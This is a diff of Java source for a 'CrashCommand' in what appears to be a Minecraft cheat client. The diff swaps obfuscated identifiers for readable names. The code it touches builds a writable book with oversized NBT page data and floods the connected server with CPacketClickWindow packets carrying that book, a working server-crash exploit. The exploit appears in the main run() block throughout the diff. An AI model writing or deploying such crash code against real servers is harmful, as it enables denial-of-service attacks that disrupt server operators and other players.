@@ -43,7 +43,7 @@ extends Command {
             @Override
             public void run() {
                 int i;
-                if (Minecraft.func_71410_x().func_147104_D() == null || Minecraft.func_71410_x().func_147104_D().field_78845_b.isEmpty()) {
+                if (Minecraft.getMinecraft().getCurrentServerData() == null || Minecraft.getMinecraft().getCurrentServerData().serverIP.isEmpty()) {
                     Command.sendMessage("Join a server monkey");
                     return;
                 }
@@ -58,7 +58,7 @@ extends Command {
                     Command.sendMessage("Are you sure you put a number?");
                     return;
                 }
-                ItemStack bookObj = new ItemStack(Items.field_151099_bA);
+                ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                 NBTTagList list = new NBTTagList();
                 NBTTagCompound tag = new NBTTagCompound();
                 int pages = Math.min(50, 100);
@@ -66,15 +66,15 @@ extends Command {
                 for (i = 0; i < pages; ++i) {
                     String siteContent = size;
                     NBTTagString tString = new NBTTagString(siteContent);
-                    list.func_74742_a((NBTBase)tString);
+                    list.appendTag((NBTBase)tString);
                 }
-                tag.func_74778_a("author", Util.mc.field_71439_g.func_70005_c_());
-                tag.func_74778_a("title", "phobos > all :^D");
-                tag.func_74782_a("pages", (NBTBase)list);
-                bookObj.func_77983_a("pages", (NBTBase)list);
-                bookObj.func_77982_d(tag);
+                tag.setString("author", Util.mc.player.getName());
+                tag.setString("title", "phobos > all :^D");
+                tag.setTag("pages", (NBTBase)list);
+                bookObj.setTagInfo("pages", (NBTBase)list);
+                bookObj.setTagCompound(tag);
                 for (i = 0; i < CrashCommand.this.packets; ++i) {
-                    Util.mc.field_71442_b.field_78774_b.func_147297_a((Packet)new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, 0));
+                    Util.mc.playerController.connection.sendPacket((Packet)new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, 0));
                 }
             }
         }.start();
